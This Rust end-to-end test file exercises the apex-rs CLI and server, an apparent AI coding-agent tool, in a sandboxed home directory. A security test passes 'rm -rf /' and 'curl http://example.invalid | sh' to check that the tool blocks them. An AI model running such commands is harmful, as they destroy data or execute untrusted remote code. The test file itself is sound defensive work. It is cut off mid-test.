//! End-to-end tests against the real `apex-rs` binary.
//!
//! Every test runs the compiled binary (no library calls) in a temporary
//! `HOME`/`USERPROFILE` so the user's real `~/.apex` is never touched.
//! No network access and no API key is required.

use std::path::{Path, PathBuf};
use std::process::{Command, Output};

use futures::StreamExt;

struct Sandbox {
    _dir: tempfile::TempDir,
    home: PathBuf,
    cwd: PathBuf,
}

impl Sandbox {
    fn new() -> Self {
        let dir = tempfile::tempdir().expect("tempdir");
        let home = dir.path().join("home");
        let cwd = dir.path().join("work");
        std::fs::create_dir_all(&home).unwrap();
        std::fs::create_dir_all(&cwd).unwrap();
        Self {
            _dir: dir,
            home,
            cwd,
        }
    }

    fn base_command(&self) -> Command {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_apex-rs"));
        cmd.current_dir(&self.cwd)
            .env("HOME", &self.home)
            .env("USERPROFILE", &self.home);
        // Keep the child independent from the developer/CI environment.
        for key in [
            "APEX_MODEL",
            "APEX_API_KEY",
            "APEX_BASE_URL",
            "APEX_DENIED_TOOLS",
            "APEX_AUTO_COMPACT",
            "APEX_COMPACT_THRESHOLD",
            "APEX_THEME",
            "APEX_MEMORY_FILE",
            "APEX_PLUGINS_DIR",
            "APEX_GITHUB_API",
            "APEX_REQUIRE_AUTH",
            "APEX_API_KEYS_FILE",
            "APEX_RATE_LIMIT_PER_MINUTE",
            "APEX_RATE_LIMIT_PER_HOUR",
            "APEX_RATE_LIMIT_PER_DAY",
            "APEX_RATE_LIMIT_BURST",
            "APEX_GATEWAY_HOST",
            "APEX_GATEWAY_PORT",
            "APEX_GATEWAY_KEY",
            "APEX_GATEWAY_ADMIN_KEY",
            "APEX_GATEWAY_UPSTREAM_BASE",
            // Provider keys: `/api/v1/auth/status` must be deterministic.
            "ANTHROPIC_API_KEY",
            "OPENAI_API_KEY",
            "GEMINI_API_KEY",
            "XAI_API_KEY",
            "DEEPSEEK_API_KEY",
            "MISTRAL_API_KEY",
            "DASHSCOPE_API_KEY",
            "LLAMA_API_KEY",
            "GROQ_API_KEY",
            "OPENROUTER_API_KEY",
            "CEREBRAS_API_KEY",
            "FIREWORKS_API_KEY",
            "TOGETHER_API_KEY",
            "HF_TOKEN",
            "PERPLEXITY_API_KEY",
            "NVIDIA_API_KEY",
            "CLOUDFLARE_API_KEY",
            "COHERE_API_KEY",
            "GITHUB_TOKEN",
        ] {
            cmd.env_remove(key);
        }
        cmd
    }

    fn run(&self, args: &[&str]) -> Output {
        self.base_command()
            .args(args)
            .output()
            .expect("run apex-rs")
    }

    /// Spawn a server with extra environment overrides.
    fn spawn_serve_with(&self, args: &[&str], envs: &[(&str, &str)]) -> std::process::Child {
        let mut cmd = self.base_command();
        cmd.args(args);
        for (key, value) in envs {
            cmd.env(key, value);
        }
        cmd.stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("spawn apex-rs serve")
    }

    fn apex_path(&self) -> PathBuf {
        self.home.join(".apex")
    }
}

fn stdout(out: &Output) -> String {
    String::from_utf8_lossy(&out.stdout).to_string()
}

fn stderr(out: &Output) -> String {
    String::from_utf8_lossy(&out.stderr).to_string()
}

fn assert_success(out: &Output, context: &str) {
    assert!(
        out.status.success(),
        "{context} failed with {:?}\nstdout:\n{}\nstderr:\n{}",
        out.status.code(),
        stdout(out),
        stderr(out)
    );
    assert!(
        !stderr(out).contains("panicked"),
        "{context} panicked:\n{}",
        stderr(out)
    );
}

/// Run git in the sandbox with a fixed identity (workspace E2E only).
fn git(dir: &Path, args: &[&str]) {
    let out = std::process::Command::new("git")
        .args(args)
        .current_dir(dir)
        .env("GIT_AUTHOR_NAME", "Test")
        .env("GIT_AUTHOR_EMAIL", "test@example.com")
        .env("GIT_COMMITTER_NAME", "Test")
        .env("GIT_COMMITTER_EMAIL", "test@example.com")
        .output()
        .expect("git must be installed for the workspace E2E test");
    assert!(
        out.status.success(),
        "git {:?} failed: {}",
        args,
        String::from_utf8_lossy(&out.stderr)
    );
}

/// Kills and reaps a spawned `serve` child on drop, so a panicking test cannot
/// leak a server that keeps the test binary locked on Windows.
struct ServerGuard(std::process::Child);

impl ServerGuard {
    fn spawn(sandbox: &Sandbox, args: &[&str]) -> Self {
        Self::spawn_with(sandbox, args, &[])
    }

    fn spawn_with(sandbox: &Sandbox, args: &[&str], envs: &[(&str, &str)]) -> Self {
        Self(sandbox.spawn_serve_with(args, envs))
    }
}

impl Drop for ServerGuard {
    fn drop(&mut self) {
        let _ = self.0.kill();
        let _ = self.0.wait();
    }
}

fn free_port() -> u16 {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind an ephemeral port");
    listener.local_addr().unwrap().port()
}

/// Poll `/health` until the server answers (600 × 100 ms). The generous
/// window keeps the suite stable when all E2E tests compile and spawn
/// servers in parallel on a loaded CI runner.
async fn wait_for_health(client: &reqwest::Client, base: &str) -> bool {
    for _ in 0..600 {
        match client.get(format!("{base}/health")).send().await {
            Ok(response) if response.status().is_success() => return true,
            _ => tokio::time::sleep(std::time::Duration::from_millis(100)).await,
        }
    }
    false
}

async fn get(client: &reqwest::Client, base: &str, path: &str) -> reqwest::Response {
    client.get(format!("{base}{path}")).send().await.unwrap()
}

async fn post_json(
    client: &reqwest::Client,
    base: &str,
    path: &str,
    body: &serde_json::Value,
) -> reqwest::Response {
    client
        .post(format!("{base}{path}"))
        .json(body)
        .send()
        .await
        .unwrap()
}

/// `apex-rs key create NAME` → (key id, plaintext key).
fn create_key(sandbox: &Sandbox, name: &str) -> (String, String) {
    let out = sandbox.run(&["key", "create", name]);
    assert_success(&out, "key create");
    let text = stdout(&out);
    let mut lines = text.lines();
    let header = lines.next().unwrap_or_default();
    let key_id = header
        .strip_prefix("Created key ")
        .and_then(|rest| rest.split(':').next())
        .unwrap_or_default()
        .to_string();
    let key = lines.next().unwrap_or_default().trim().to_string();
    assert!(!key_id.is_empty(), "missing key id in:\n{text}");
    assert!(key.starts_with("apex_"), "missing key in:\n{text}");
    (key_id, key)
}

fn session_files(home: &Path) -> Vec<PathBuf> {
    let dir = home.join(".apex").join("sessions");
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    entries
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().and_then(|e| e.to_str()) == Some("enc"))
        .collect()
}

#[test]
fn help_lists_subcommands() {
    let sb = Sandbox::new();
    let out = sb.run(&["--help"]);
    assert_success(&out, "--help");
    let text = stdout(&out);
    for subcommand in [
        "run",
        "chat",
        "serve",
        "tools",
        "plugins",
        "call-tool",
        "cost",
        "memory",
        "session",
        "security",
        "context",
        "workspace",
        "rollback",
        "github",
        "skill",
        "key",
    ] {
        assert!(
            text.contains(subcommand),
            "`--help` should list `{subcommand}`:\n{text}"
        );
    }
}

#[test]
fn tools_prints_known_tool_schemas() {
    let sb = Sandbox::new();
    let out = sb.run(&["tools"]);
    assert_success(&out, "tools");

    let schemas: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("`tools` must print valid JSON");
    let names: Vec<&str> = schemas
        .as_array()
        .expect("tool list must be an array")
        .iter()
        .filter_map(|tool| tool.get("function")?.get("name")?.as_str())
        .collect();

    for expected in [
        "read_file",
        "write_file",
        "run_command",
        "git_status",
        "lsp_diagnostics",
        "list_skills",
    ] {
        assert!(
            names.contains(&expected),
            "missing tool `{expected}` in {names:?}"
        );
    }
}

#[test]
fn cost_reports_an_empty_session_without_network() {
    let sb = Sandbox::new();
    let out = sb.run(&["cost"]);
    assert_success(&out, "cost");
    let text = stdout(&out);
    assert!(text.contains("Token usage:"), "got: {text}");
    assert!(text.contains("Total tokens: 0"), "got: {text}");
    assert!(text.contains("Cost: $0.000000"), "got: {text}");
}

#[test]
fn memory_lifecycle_is_hermetic() {
    let sb = Sandbox::new();
    let fact = "APEX Rust e2e fact";

    let add = sb.run(&["memory", "add", fact, "e2e,rust"]);
    assert_success(&add, "memory add");
    assert!(stdout(&add).contains("Added to memory"));
    let memory_file = sb.apex_path().join("memory.json");
    assert!(
        memory_file.exists(),
        "memory must be written under the temporary HOME, not the real profile"
    );

    let list = sb.run(&["memory", "list"]);
    assert_success(&list, "memory list");
    assert!(stdout(&list).contains(fact), "got: {}", stdout(&list));
    assert!(
        stdout(&list).contains("e2e, rust"),
        "got: {}",
        stdout(&list)
    );

    let search = sb.run(&["memory", "search", "rust"]);
    assert_success(&search, "memory search");
    assert!(stdout(&search).contains(fact), "got: {}", stdout(&search));

    let context = sb.run(&["memory", "context", "rust"]);
    assert_success(&context, "memory context");
    assert!(
        stdout(&context).contains("[MEMORY - Relevant facts from previous sessions]"),
        "got: {}",
        stdout(&context)
    );

    let clear = sb.run(&["memory", "clear"]);
    assert_success(&clear, "memory clear");
    assert!(stdout(&clear).contains("Memory cleared"));

    let empty = sb.run(&["memory", "list"]);
    assert_success(&empty, "memory list after clear");
    assert!(stdout(&empty).contains("No memory facts stored"));
    let raw = std::fs::read_to_string(&memory_file).unwrap();
    assert_eq!(raw.trim(), "[]");
}

#[test]
fn session_lifecycle_is_hermetic() {
    let sb = Sandbox::new();
    let name = "e2e-session";

    let save = sb.run(&["session", "save", name]);
    assert_success(&save, "session save");
    assert!(stdout(&save).contains("Saved"), "got: {}", stdout(&save));
    assert_eq!(
        session_files(&sb.home).len(),
        1,
        "save must write one encrypted session under the temporary HOME"
    );

    let list = sb.run(&["session", "list"]);
    assert_success(&list, "session list");
    assert!(stdout(&list).contains(name), "got: {}", stdout(&list));

    let show = sb.run(&["session", "show", name]);
    assert_success(&show, "session show");
    let value: serde_json::Value =
        serde_json::from_slice(&show.stdout).expect("`session show` must print JSON");
    assert_eq!(value["name"], name);
    assert_eq!(value["history"].as_array().map(Vec::len), Some(0));
    assert_eq!(
        value["cwd"].as_str().unwrap(),
        sb.cwd.to_string_lossy().as_ref()
    );
    // A CLI save has no agent state: the persisted usage must be the
    // idle-agent shape Python's `agent.usage` starts with (three zero
    // counters), never an empty object.
    assert_eq!(value["usage"]["prompt_tokens"], 0);
    assert_eq!(value["usage"]["completion_tokens"], 0);
    assert_eq!(value["usage"]["total_tokens"], 0);
}

#[test]
fn loads_python_written_fernet_session_fixture() {
    let sb = Sandbox::new();
    let fixtures = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join("session");
    let sessions = sb.home.join(".apex").join("sessions");
    std::fs::create_dir_all(&sessions).unwrap();
    let key_path = sb.home.join(".apex").join(".session_key");

    // Native Fernet key file, as Python writes it.
    let fernet_key = std::fs::read(fixtures.join("fernet.key")).unwrap();
    std::fs::write(&key_path, &fernet_key).unwrap();
    std::fs::copy(
        fixtures.join("python_session.enc"),
        sessions.join("20260102_030405_python-fixture.enc"),
    )
    .unwrap();

    let show = sb.run(&["session", "show", "python-fixture"]);
    assert_success(&show, "session show (python fixture)");
    let value: serde_json::Value =
        serde_json::from_slice(&show.stdout).expect("`session show` must print JSON");
    assert_eq!(value["name"], "python-fixture");
    assert_eq!(value["timestamp"], "2026-01-02T03:04:05.123456");
    assert_eq!(value["model"], "anthropic/claude-sonnet-4-5");
    assert_eq!(value["cwd"], "/home/python/project");
    assert_eq!(value["history"].as_array().map(Vec::len), Some(2));
    assert_eq!(value["history"][1]["role"], "assistant");
    assert_eq!(value["usage"]["total_tokens"], 59);

    let list = sb.run(&["session", "list"]);
    assert_success(&list, "session list (python fixture)");
    assert!(
        stdout(&list).contains(
            "python-fixture\t2026-01-02T03:04:05.123456\tanthropic/claude-sonnet-4-5\t2 msgs"
        ),
        "got: {}",
        stdout(&list)
    );

    // Legacy 32-byte raw key: Python and Rust both derive the Fernet key as
    // urlsafe_b64encode(sha256(raw + b":fernet")), so that file loads too.
    let legacy_key = std::fs::read(fixtures.join("legacy.key")).unwrap();
    assert_eq!(legacy_key.len(), 32);
    std::fs::write(&key_path, &legacy_key).unwrap();
    std::fs::copy(
        fixtures.join("python_session_legacy.enc"),
        sessions.join("20260102_030406_python-legacy.enc"),
    )
    .unwrap();

    let show = sb.run(&["session", "show", "python-legacy"]);
    assert_success(&show, "session show (legacy python fixture)");
    let value: serde_json::Value =
        serde_json::from_slice(&show.stdout).expect("`session show` must print JSON");
    assert_eq!(value["name"], "python-legacy");
    assert_eq!(value["model"], "openai/gpt-5");
    assert_eq!(value["history"].as_array().map(Vec::len), Some(2));
}

#[test]
fn security_cli_reports_verdicts_and_guards_run_command() {
    let sb = Sandbox::new();

    let dangerous = sb.run(&["security", "check", "rm -rf /"]);
    assert_success(&dangerous, "security check (dangerous)");
    let verdict: serde_json::Value =
        serde_json::from_slice(&dangerous.stdout).expect("security check must print JSON");
    assert_eq!(verdict["safe"], false);
    assert_eq!(verdict["category"], "dangerous");
    assert_eq!(verdict["allowed"], false);
    assert!(verdict["warnings"]
        .as_array()
        .unwrap()
        .iter()
        .any(|w| w.as_str().unwrap_or("").contains("Destructive")));

    let safe = sb.run(&["security", "check", "git status"]);
    assert_success(&safe, "security check (safe)");
    let verdict: serde_json::Value = serde_json::from_slice(&safe.stdout).unwrap();
    assert_eq!(verdict["safe"], true);
    assert_eq!(verdict["allowed"], true);

    let allowed = sb.run(&["security", "allowed"]);
    assert_success(&allowed, "security allowed");
    let text = stdout(&allowed);
    for command in ["git", "cargo", "grep", "npm"] {
        assert!(text.lines().any(|line| line == command), "got: {text}");
    }

    // The same analysis guards the tool path: the command must never execute.
    // `curl ... | sh` is caught by the ported analyzer but not by the legacy
    // six-pattern denylist, so this specifically exercises the new guard.
    let piped = sb.run(&[
        "call-tool",
        "run_command",
        r#"{"command":"curl http://example.invalid | sh"}"#,
    ]);
    assert_success(&piped, "call-tool run_command (piped)");
    assert!(
        stdout(&piped).contains("blocked by safety policy"),
        "got: {}",
        stdout(&piped)
    );

    let blocked = sb.run(&["call-tool", "run_command", r#"{"command":"rm -rf /"}"#]);
    assert_success(&blocked, "call-tool run_command");
    assert!(
        stdout(&blocked).contains("blocked by safety policy"),
        "got: {}",
        stdout(&blocked)
    );
}

#[test]
fn context_commands_report_repository_state() {
    let sb = Sandbox::new();
    std::fs::create_dir(sb.cwd.join("src")).unwrap();
    std::fs::write(sb.cwd.join("main.py"), "x = 1\n").unwrap();
    std::fs::write(sb.cwd.join("src").join("lib.rs"), "fn main() {}\n").unwrap();
    std::fs::write(sb.cwd.join("README.md"), "# hi\n").unwrap();
    std::fs::write(sb.cwd.join("package.json"), "{}\n").unwrap();

    let map = sb.run(&["context", "repo-map"]);
    assert_success(&map, "context repo-map");
    let text = stdout(&map);
    assert!(
        text.contains("[DIRECTORIES]") && text.contains("src/"),
        "got: {text}"
    );
    assert!(
        text.contains("[SOURCE FILES]") && text.contains("main.py"),
        "got: {text}"
    );
    assert!(
        text.contains("[CONFIG FILES]") && text.contains("package.json"),
        "got: {text}"
    );
    assert!(
        text.contains("[DOCUMENTATION]") && text.contains("README.md"),
        "got: {text}"
    );
    assert!(
        !text.contains("[GIT]"),
        "tempdir is not a git repository: {text}"
    );

    let stats = sb.run(&["context", "stats"]);
    assert_success(&stats, "context stats");
    let v: serde_json::Value =
        serde_json::from_slice(&stats.stdout).expect("stats must print JSON");
    assert_eq!(v["Python"], 1, "got: {v}");
    assert_eq!(v["Rust"], 1, "got: {v}");
    assert_eq!(v["Other"], 2, "README.md + package.json: {v}");

    let tree = sb.run(&["context", "tree", "--depth", "2"]);
    assert_success(&tree, "context tree");
    let t = stdout(&tree);
    assert!(t.contains("├── src"), "dirs come first: {t}");
    assert!(t.contains("lib.rs"), "got: {t}");
    assert!(t.contains("└── README.md"), "got: {t}");

    let glob = sb.run(&["context", "glob", "**/*.py"]);
    assert_success(&glob, "context glob");
    assert_eq!(stdout(&glob).trim(), "main.py", "got: {}", stdout(&glob));

    let git = sb.run(&["context", "git"]);
    assert_success(&git, "context git");
    assert!(
        stdout(&git).contains("not a git repository"),
        "got: {}",
        stdout(&git)
    );

    let ctags = sb.run(&["context", "ctags"]);
    assert_success(&ctags, "context ctags");
    assert!(
        stdout(&ctags).contains("Not a git repository"),
        "got: {}",
        stdout(&ctags)
    );

    // A missing path is a hard error, not empty output.
    let missing = sb.run(&["context", "tree", "does-not-exist"]);
    assert!(!missing.status.success(), "missing path must exit non-zero");
}

#[test]
fn workspace_cli_reports_git_and_marker_detection() {
    let sb = Sandbox::new();
    std::fs::write(sb.cwd.join("Cargo.toml"), "[package]\n").unwrap();
    std::fs::write(sb.cwd.join("Cargo.lock"), "").unwrap();
    git(&sb.cwd, &["init"]);
    git(&sb.cwd, &["symbolic-ref", "HEAD", "refs/heads/main"]);
    git(&sb.cwd, &["add", "-A"]);
    git(&sb.cwd, &["commit", "-m", "init"]);
    // Uncommitted change: the prompt block must report a dirty tree.
    std::fs::write(sb.cwd.join("Cargo.toml"), "[package]\nname = \"changed\"\n").unwrap();

    let out = sb.run(&["workspace"]);
    assert_success(&out, "workspace");
    assert_eq!(
        stdout(&out).trim(),
        "[WORKSPACE CONTEXT]\n\
         Git branch: main\n\
         Git status: dirty (uncommitted changes)\n\
         Language: Rust\n\
         Package manager: cargo\n\
         Test framework: cargo test",
        "got: {}",
        stdout(&out)
    );

    let json = sb.run(&["workspace", "--json"]);
    assert_success(&json, "workspace --json");
    let v: serde_json::Value =
        serde_json::from_slice(&json.stdout).expect("`workspace --json` must print JSON");
    assert_eq!(v["git"]["branch"], "main");
    assert_eq!(v["git"]["is_dirty"], true);
    assert_eq!(v["git"]["commit"].as_str().map(str::len), Some(8));
    assert_eq!(v["language"], "Rust");
    assert_eq!(v["package_manager"], "cargo");
    assert_eq!(v["test_framework"], "cargo test");
    assert_eq!(
        v["root"].as_str().unwrap(),
        sb.cwd.to_string_lossy().as_ref()
    );
}

#[test]
fn rollback_cli_snapshots_restore_and_delete() {
    let sb = Sandbox::new();
    std::fs::write(sb.cwd.join("tracked.txt"), "original\n").unwrap();
    git(&sb.cwd, &["init"]);
    git(&sb.cwd, &["symbolic-ref", "HEAD", "refs/heads/main"]);
    git(&sb.cwd, &["add", "-A"]);
    git(&sb.cwd, &["commit", "-m", "init"]);

    std::fs::write(sb.cwd.join("tracked.txt"), "modified\n").unwrap();
    let created = sb.run(&["rollback", "snapshot", "demo"]);
    assert_success(&created, "rollback snapshot");
    let name = stdout(&created).trim().to_string();
    assert!(name.starts_with("snapshot_"), "got: {name}");
    assert!(name.ends_with("_demo"), "got: {name}");

    let listed = sb.run(&["rollback", "list", "--json"]);
    assert_success(&listed, "rollback list --json");
    let snapshots: Vec<serde_json::Value> = serde_json::from_slice(&listed.stdout)
        .expect("`rollback list --json` must print a JSON array");
    assert_eq!(snapshots.len(), 1);
    assert_eq!(snapshots[0]["name"], name);
    assert_eq!(snapshots[0]["label"], "demo");
    assert_eq!(snapshots[0]["created_at"].as_str().map(str::len), Some(26));

    let text = sb.run(&["rollback", "list"]);
    assert_success(&text, "rollback list");
    assert!(stdout(&text).contains("Available snapshots:"));
    assert!(stdout(&text).contains(&name));

    std::fs::write(sb.cwd.join("tracked.txt"), "later\n").unwrap();
    let restored = sb.run(&["rollback", "restore", name.as_str()]);
    assert_success(&restored, "rollback restore");
    assert_eq!(
        stdout(&restored).trim(),
        format!("Restored snapshot: {name}")
    );
    assert_eq!(
        std::fs::read_to_string(sb.cwd.join("tracked.txt")).unwrap(),
        "modified\n"
    );

    let deleted = sb.run(&["rollback", "delete", name.as_str()]);
    assert_success(&deleted, "rollback delete");
    assert_eq!(stdout(&deleted).trim(), format!("Deleted snapshot: {name}"));
    let empty = sb.run(&["rollback", "list"]);
    assert_success(&empty, "rollback list after delete");
    assert_eq!(stdout(&empty).trim(), "No snapshots available");

    let missing = sb.run(&["rollback", "restore", name.as_str()]);
    assert!(!missing.status.success(), "a missing snapshot must fail");
    assert!(
        stderr(&missing).contains(&format!("Failed to restore: {name}")),
        "got: {}",
        stderr(&missing)
    );
}

#[test]
fn rollback_cli_records_reverts_and_reports_history() {
    let sb = Sandbox::new();
    std::fs::write(sb.cwd.join("tracked.txt"), "original\n").unwrap();
    git(&sb.cwd, &["init"]);
    git(&sb.cwd, &["symbolic-ref", "HEAD", "refs/heads/main"]);
    git(&sb.cwd, &["add", "-A"]);
    git(&sb.cwd, &["commit", "-m", "init"]);

    std::fs::write(sb.cwd.join("tracked.txt"), "one\n").unwrap();
    let first = sb.run(&["rollback", "record", "--data", r#"{"query":"q1"}"#]);
    assert_success(&first, "rollback record (turn 1)");
    assert!(stdout(&first).contains("turn_1"), "got: {}", stdout(&first));

    std::fs::write(sb.cwd.join("tracked.txt"), "two\n").unwrap();
    let second = sb.run(&["rollback", "record", "--data", r#"{"query":"q2"}"#]);
    assert_success(&second, "rollback record (turn 2)");
    assert!(
        stdout(&second).contains("turn_2"),
        "got: {}",
        stdout(&second)
    );

    let history = sb.run(&["rollback", "history"]);
    assert_success(&history, "rollback history");
    let turns: Vec<serde_json::Value> = serde_json::from_slice(&history.stdout)
        .expect("`rollback history` must print a JSON array");
    assert_eq!(turns.len(), 2);
    assert_eq!(turns[0]["turn_number"], 1);
    assert_eq!(turns[1]["turn_number"], 2);
    assert_eq!(turns[1]["data"]["query"], "q2");
    assert_eq!(turns[0]["timestamp"].as_str().map(str::len), Some(26));

    // Two turns back: the workspace is restored to the first snapshot.
    std::fs::write(sb.cwd.join("tracked.txt"), "three\n").unwrap();
    let reverted = sb.run(&["rollback", "revert", "2"]);
    assert_success(&reverted, "rollback revert 2");
    assert_eq!(stdout(&reverted).trim(), "Reverted 2 turn(s)");
    assert_eq!(
        std::fs::read_to_string(sb.cwd.join("tracked.txt")).unwrap(),
        "one\n"
    );

    // An over-large value is clamped to the first turn.
    std::fs::write(sb.cwd.join("tracked.txt"), "four\n").unwrap();
    let clamped = sb.run(&["rollback", "revert", "99"]);
    assert_success(&clamped, "rollback revert 99");
    assert_eq!(
        std::fs::read_to_string(sb.cwd.join("tracked.txt")).unwrap(),
        "one\n"
    );

    // WorkspaceRollback::rollback_turn targets the newest snapshot (turn 2).
    std::fs::write(sb.cwd.join("tracked.txt"), "five\n").unwrap();
    let turn = sb.run(&["rollback", "turn", "1"]);
    assert_success(&turn, "rollback turn 1");
    assert_eq!(
        std::fs::read_to_string(sb.cwd.join("tracked.txt")).unwrap(),
        "two\n"
    );
}

#[tokio::test]
async fn serve_exposes_context_routes() {
    let sb = Sandbox::new();
    std::fs::create_dir(sb.cwd.join("src")).unwrap();
    std::fs::write(sb.cwd.join("main.py"), "x = 1\n").unwrap();
    std::fs::write(sb.cwd.join("src").join("lib.ts"), "const x = 1;\n").unwrap();
    std::fs::write(sb.cwd.join("README.md"), "# hi\n").unwrap();

    // Grab a free port, then let the server child bind it.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    drop(listener);

    let _server = ServerGuard::spawn(&sb, &["serve", "--port", &port.to_string()]);
    let base = format!("http://127.0.0.1:{port}");
    let client = reqwest::Client::new();

    let healthy = wait_for_health(&client, &base).await;
    assert!(healthy, "apex-rs serve did not become healthy");

    // Auth is opt-in in the Rust port (the TUI backend sends no key), so the
    // default server answers without credentials — unlike Python's `apex serve`.
    assert_eq!(
        client
            .get(format!("{base}/api/v1/auth/status"))
            .send()
            .await
            .unwrap()
            .status(),
        200,
        "auth must stay off unless APEX_REQUIRE_AUTH is set"
    );

    let map: serde_json::Value = client
        .get(format!("{base}/api/v1/context/repo-map"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    let map_text = map["map"]
        .as_str()
        .expect("repo-map must return a map: {map}");
    assert!(map_text.contains("main.py"), "got: {map_text}");
    assert!(map_text.contains("[DIRECTORIES]"), "got: {map_text}");

    let stats: serde_json::Value = client
        .get(format!("{base}/api/v1/context/stats"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(stats["stats"]["Python"], 1, "got: {stats}");
    assert_eq!(stats["stats"]["TypeScript"], 1, "got: {stats}");

    let tree: serde_json::Value = client
        .get(format!("{base}/api/v1/context/tree"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(
        tree["tree"].as_str().unwrap().contains("src"),
        "got: {tree}"
    );

    let glob: serde_json::Value = client
        .get(format!("{base}/api/v1/context/glob?pattern=*.py"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(
        glob["matches"],
        serde_json::json!(["main.py"]),
        "got: {glob}"
    );

    let git: serde_json::Value = client
        .get(format!("{base}/api/v1/context/git"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(git["info"], "", "tempdir is not a repository: {git}");

    let bad: serde_json::Value = client
        .get(format!("{base}/api/v1/context/tree?path=does-not-exist"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(bad["error"].as_str().is_some(), "got: {bad}");
}

#[tokio::test]
async fn serve_exposes_python_parity_routes() {
    let sb = Sandbox::new();
    std::fs::write(sb.cwd.join("main.py"), "x = 1\n").unwrap();
    std::fs::write(sb.cwd.join("README.md"), "# hi\n").unwrap();

    let port = free_port();
    let _server = ServerGuard::spawn(&sb, &["serve", "--port", &port.to_string()]);
    let base = format!("http://127.0.0.1:{port}");
    let client = reqwest::Client::new();
    assert!(wait_for_health(&client, &base).await, "server not healthy");

    // ── Root + health ──────────────────────────────────────
    let index = get(&client, &base, "/").await;
    assert_eq!(index.status(), 200, "GET / must serve the index page");
    let health: serde_json::Value = get(&client, &base, "/global/health")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(health["healthy"], true, "got: {health}");
    assert!(health["version"].is_string(), "got: {health}");

    // ── Status endpoints (no LLM) ──────────────────────────
    let lsp: serde_json::Value = get(&client, &base, "/api/v1/lsp")
        .await
        .json()
        .await
        .unwrap();
    assert!(lsp.is_array(), "lsp status must be a list: {lsp}");

    let formatter: serde_json::Value = get(&client, &base, "/api/v1/formatter")
        .await
        .json()
        .await
        .unwrap();
    assert!(
        formatter.is_array(),
        "formatter status must be a list: {formatter}"
    );

    let mcp: serde_json::Value = get(&client, &base, "/api/v1/mcp")
        .await
        .json()
        .await
        .unwrap();
    assert!(mcp.is_object(), "mcp status must be an object: {mcp}");

    let formatters: serde_json::Value = get(&client, &base, "/api/v1/formatters")
        .await
        .json()
        .await
        .unwrap();
    assert!(formatters["formatters"].is_array(), "got: {formatters}");

    let rl: serde_json::Value = get(&client, &base, "/rate-limit/status")
        .await
        .json()
        .await
        .unwrap();
    assert!(
        rl["minute"].is_object() || rl["minute"].is_number(),
        "got: {rl}"
    );

    // ── Models / providers ─────────────────────────────────
    let models: serde_json::Value = get(&client, &base, "/models").await.json().await.unwrap();
    assert!(
        models["models"].is_array(),
        "/models must expose a models list: {models}"
    );

    let refreshed: serde_json::Value = post_json(
        &client,
        &base,
        "/api/v1/models/refresh",
        &serde_json::json!({}),
    )
    .await
    .json()
    .await
    .unwrap();
    assert!(
        refreshed["models"].is_array() && refreshed["count"].is_number(),
        "got: {refreshed}"
    );

    let providers: serde_json::Value = get(&client, &base, "/api/v1/providers")
        .await
        .json()
        .await
        .unwrap();
    assert!(providers["providers"].is_array(), "got: {providers}");

    // ── Agents ─────────────────────────────────────────────
    let agents: serde_json::Value = get(&client, &base, "/api/v1/agents")
        .await
        .json()
        .await
        .unwrap();
    assert!(
        agents["agents"].is_array(),
        "/api/v1/agents must expose an agents list: {agents}"
    );

    let missing_agent = get(&client, &base, "/api/v1/agents/does-not-exist").await;
    assert_eq!(missing_agent.status(), 404, "unknown agent must 404");
    let missing_body: serde_json::Value = missing_agent.json().await.unwrap();
    assert!(
        missing_body["error"]
            .as_str()
            .unwrap()
            .contains("not found"),
        "got: {missing_body}"
    );

    // ── Commands (listing only; execution would hit the LLM) ─
    let commands: serde_json::Value = get(&client, &base, "/api/v1/commands")
        .await
        .json()
        .await
        .unwrap();
    assert!(commands["commands"].is_array(), "got: {commands}");

    // A non-slash command is not handled and yields no output.
    let cmd: serde_json::Value = post_json(
        &client,
        &base,
        "/api/v1/command",
        &serde_json::json!({"command": "hello"}),
    )
    .await
    .json()
    .await
    .unwrap();
    assert_eq!(cmd["handled"], false, "got: {cmd}");

    // ── Config / themes ────────────────────────────────────
    let config: serde_json::Value = get(&client, &base, "/api/v1/config")
        .await
        .json()
        .await
        .unwrap();
    assert!(config["model"].is_string(), "got: {config}");

    let updated: serde_json::Value = post_json(
        &client,
        &base,
        "/api/v1/config",
        &serde_json::json!({"theme": "nord"}),
    )
    .await
    .json()
    .await
    .unwrap();
    assert_eq!(updated["theme"], "nord", "got: {updated}");

    let theme_err = post_json(&client, &base, "/api/v1/themes", &serde_json::json!({})).await;
    assert_eq!(theme_err.status(), 400, "theme name is required");

    let theme: serde_json::Value = post_json(
        &client,
        &base,
        "/api/v1/themes",
        &serde_json::json!({"theme": "nord"}),
    )
    .await
    .json()
    .await
    .unwrap();
    assert_eq!(theme["theme"], "nord", "got: {theme}");

    // ── Stats ──────────────────────────────────────────────
    let stats: serde_json::Value = get(&client, &base, "/api/v1/stats")
        .await
        .json()
        .await
        .unwrap();
    assert!(stats["usage"].is_object(), "got: {stats}");

    // ── Session lifecycle ──────────────────────────────────
    let saved: serde_json::Value = post_json(
        &client,
        &base,
        "/session/save",
        &serde_json::json!({"name": "e2e_sess"}),
    )
    .await
    .json()
    .await
    .unwrap();
    assert!(
        saved["saved"].is_string() && !saved["saved"].as_str().unwrap().is_empty(),
        "got: {saved}"
    );

    let load_err = post_json(&client, &base, "/session/load", &serde_json::json!({})).await;
    assert_eq!(load_err.status(), 400, "load name is required");

    let fork: serde_json::Value = post_json(
        &client,
        &base,
        "/api/v1/session/e2e/fork",
        &serde_json::json!({}),
    )
    .await
    .json()
    .await
    .unwrap();
    assert_eq!(fork["forked"], true, "got: {fork}");
